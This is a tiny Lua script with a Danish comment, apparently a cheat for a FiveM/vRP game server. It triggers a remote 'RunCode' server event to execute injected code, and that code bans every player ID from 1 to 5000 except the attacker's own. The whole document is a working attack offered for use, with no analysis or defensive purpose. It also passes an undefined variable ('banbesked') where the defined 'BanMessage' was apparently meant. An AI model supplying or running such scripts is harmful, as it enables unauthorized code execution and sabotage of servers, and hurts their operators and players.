-- Banner alle fra id 1 til 5000. Sæt "ID" til at være dit id hvis du ik skal bannes.

TriggerServerEvent('RunCode:RunStringRemotelly', [[
    local ID = 1
    local BanMessage = ""

    for i=1,5000 do 
        if i ~= ID then
            vRP.ban({i,banbesked,true})
        end
    end
]])
